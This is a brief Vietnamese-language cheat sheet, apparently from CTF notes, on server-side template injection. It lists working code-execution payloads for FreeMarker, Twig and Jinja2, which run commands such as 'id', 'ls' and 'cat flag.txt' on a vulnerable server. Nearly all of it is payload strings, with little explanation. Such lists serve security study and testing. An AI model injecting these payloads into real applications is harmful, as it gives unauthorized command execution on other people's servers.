[Tham khao PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

# Nhận Biết 
![](https://github.com/tinasahara1/Vulnerable-CTF-/blob/287a3962715837c0365f5ec4a4d483d76721cf02/SQL/MySQL/image/ssti.png)


## FreeMarker (Java) : The template can be ${3*3} or the legacy #{3*3}
![freemarket](https://github.com/tinasahara1/Vulnerable-CTF-/blob/287a3962715837c0365f5ec4a4d483d76721cf02/SQL/MySQL/image/freemarket.png)


### Payload
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```


## Twig (PHP) 
![twig](https://github.com/tinasahara1/Vulnerable-CTF-/blob/287a3962715837c0365f5ec4a4d483d76721cf02/SQL/MySQL/image/twig.png)


### Payload
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```


## Jinja2 (Python) 
![jira](https://github.com/tinasahara1/Vulnerable-CTF-/blob/287a3962715837c0365f5ec4a4d483d76721cf02/SQL/MySQL/image/jira.png)



### Payload
```py
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

